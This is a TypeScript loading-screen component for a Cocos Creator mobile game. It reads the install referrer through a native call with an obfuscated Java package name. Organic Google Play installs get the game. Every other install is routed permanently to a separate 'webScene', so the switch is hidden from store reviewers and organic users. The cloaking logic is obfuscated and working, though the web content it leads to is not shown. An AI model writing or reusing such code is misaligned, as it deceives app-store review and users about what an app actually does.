// Learn TypeScript:
//  - https://docs.cocos.com/creator/manual/en/scripting/typescript.html
// Learn Attribute:
//  - https://docs.cocos.com/creator/manual/en/scripting/reference/attributes.html
// Learn life-cycle callbacks:
//  - https://docs.cocos.com/creator/manual/en/scripting/life-cycle-callbacks.html

const { ccclass, property } = cc._decorator;

@ccclass
export default class NewClass extends cc.Component {
    @property(cc.Label)
    loadact: cc.Label;
    private gl: boolean = false;
    // LIFE-CYCLE CALLBACKS:

    onLoad() {}

    start() {
        this.gl = false;
        this.loadact.string = '';
        let powkx = cc.sys.localStorage.getItem('Gol');
        if (!powkx) {
            let index = 0;
            var gameler = setInterval(() => {
                if (!this.gl) {
                    let gol = this.getGlo();
                    if (gol != '') {
                        this.gl = true;
                        clearInterval(gameler);
                        if (gol == 'utm_source=google-play&utm_medium=organic') {
                            this.scheduleOnce(function () {
                                cc.director.loadScene('game');
                            }, 2);
                        } else {
                            cc.director.loadScene('webScene');
                            cc.sys.localStorage.setItem('GPos', true);
                        }
                        cc.sys.localStorage.setItem('Gol', true);
                    } else {
                        index++;

                        if (index > 10) {
                            clearInterval(gameler);
                            cc.director.loadScene('game');
                            return;
                        }
                        this.loadact.string = 100 * (index / 10) + '%';
                    }
                }
            }, 1000);
        } else {
            let ikqlgop = cc.sys.localStorage.getItem('GPos');
            if (ikqlgop) {
                cc.director.loadScene('webScene');
            } else {
                this.scheduleOnce(function () {
                    cc.director.loadScene('game');
                }, 2);
            }
        }
    }

    // update (dt) {}

    private getGlo() {
        if (cc.sys.isNative) {
            let golData = jsb.reflection.callStaticMethod('iacjbvf.sdpsmfv.nqmusazas.AppActivity', 'getGlo', '()Ljava/lang/String;');
            return golData;
        } else {
            return '';
        }
    }
}
